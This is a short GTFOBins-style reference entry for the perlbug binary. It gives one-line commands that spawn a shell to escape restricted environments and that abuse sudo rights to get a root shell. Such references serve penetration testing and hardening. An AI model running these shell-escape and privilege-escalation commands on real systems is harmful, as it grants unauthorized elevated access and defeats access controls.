# GTFOBin: perlbug

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
```